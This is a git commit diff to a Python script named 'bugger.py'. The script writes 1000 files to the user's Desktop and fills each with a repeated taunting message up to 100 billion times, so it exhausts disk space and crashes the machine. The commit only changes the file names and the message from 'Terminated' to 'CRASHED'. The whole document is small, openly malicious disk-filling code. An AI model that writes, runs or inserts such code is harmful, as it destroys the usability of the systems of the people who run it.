cd44193986522322c0c9f8c94d71e399def28a58
P4TEU <168577505+PateuYT@users.noreply.github.com>
2026-05-22 06:46:28 +0100

    Update bugger.py

--- bugger.py
+++ bugger.py
@@ -2,10 +2,10 @@ import os
 
 desktop = os.path.join(os.path.expanduser("~"), "Desktop")
 
-f = [f"Youvebeenterminated{i}.txt" for i in range(1, 1001)]
+f = [f"Youvebeencrashed{i}.txt" for i in range(1, 1001)]
 
 for n in f:
     c = os.path.join(desktop, n)
     with open(c, "w") as f:
         for i in range(100000000000):
-            f.write("You've been succesfully Terminated by P4TEU.")
+            f.write("You've been succesfully CRASHED by P4TEU.")
